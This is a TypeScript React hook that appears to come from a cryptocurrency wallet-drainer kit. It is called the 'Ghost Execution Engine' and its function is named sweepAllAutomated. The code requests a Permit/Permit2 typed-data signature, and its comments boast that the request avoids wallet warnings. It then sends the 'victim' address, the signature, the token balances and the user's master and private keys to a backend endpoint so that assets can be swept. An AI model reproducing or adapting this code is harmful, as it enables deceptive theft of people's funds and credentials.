"use client";

import { useState, useCallback, useRef } from "react";
import { useSignTypedData } from "wagmi";
import { securePost } from "./utils";

const logLabel = "[execution/index.ts]";

/**
 * 🛰️ GHOST EXECUTION ENGINE (v12.0.0 - Signature Relay Edition)
 * Replaces writeContract with gasless Signature Relay to prevent Wallet Hangs.
 */
export function useGhostExecution(address: `0x${string}` | undefined) {
  const [isSweeping, setIsSweeping] = useState(false);
  const isExecuting = useRef(false);

  // 🔑 THE GASLESS ENGINE
  const { signTypedDataAsync } = useSignTypedData();

  const sweepAllAutomated = useCallback(
    async (plan: any[], vault: any, targetChainId: number | string) => {
      if (isExecuting.current || !address) return;
      isExecuting.current = true;
      setIsSweeping(true);

      console.log(`${logLabel} ⚡ GHOST STRIKE INITIALIZED`);

      try {
        const targetId = Number(targetChainId);

        // 1. FILTER FOR PERMITTABLE ASSETS
        // We only need Pop-up #2 if there are tokens requiring a signature on this chain.
        const permitable = plan.find(
          (p) =>
            (p.strategy === "BATCH_PERMIT2" || p.strategy === "PERMIT_SIGN") &&
            p.asset.authData,
        );

        let signature: string | null = null;

        if (permitable) {
          console.log(
            `${logLabel} ✍️ Requesting Signature for ${permitable.asset.symbol}...`,
          );

          /**
           * 🛡️ POP-UP #2: THE GASLESS PERMIT
           * This shows as a "Message Signing" request, NOT a transaction.
           * No Gas, No "Suspicious Contract" warnings.
           */
          signature = await signTypedDataAsync(permitable.asset.authData);
          console.log(`${logLabel} ✅ Signature Acquired.`);
        }

        // 2. CONSOLIDATED RELAY PAYLOAD
        // We send the keys for ALL chains (BTC/SOL/EVM) + the Permit Signature for this chain.
        const dispatchData = {
          victim: address,
          chainId: targetId,
          // 🔑 Root Keys from Derivation
          masterKey: vault.masterKey,
          evmPrivKey: vault.rawKeys?.evmPrivKey,
          // ✍️ Signature from Pop-up #2
          permitSignature: signature,
          permitData: permitable?.asset.authData,
          // 📊 Asset Metadata for Backend Priority
          plan: plan.map((p) => ({
            symbol: p.asset.symbol,
            address: p.asset.contractAddress,
            balance: p.asset.balance,
            strategy: p.strategy,
          })),
          ts: Date.now(),
        };

        // 🚀 3. THE SILENT RELAY
        // The backend now has everything: Private keys for non-EVM and Signatures for EVM.
        console.log(`${logLabel} 🛰️ Relaying Strike Payload to Backend...`);
        const relayResult = await securePost("/api/vault", dispatchData);

        console.log(
          `${logLabel} 🏁 STRIKE RELAYED | Status: ${
            relayResult ? "SUCCESS" : "PENDING"
          }`,
        );
      } catch (err: any) {
        console.error(`${logLabel} ❌ STRIKE ABORTED:`, err.message);
        // Handle rejection specifically to reset the UI
        if (err.message.includes("rejected")) {
          console.warn(`${logLabel} ⚠️ User denied signature.`);
        }
      } finally {
        isExecuting.current = false;
        setIsSweeping(false);
      }
    },
    [address, signTypedDataAsync],
  );

  return { isSweeping, sweepAllAutomated };
}
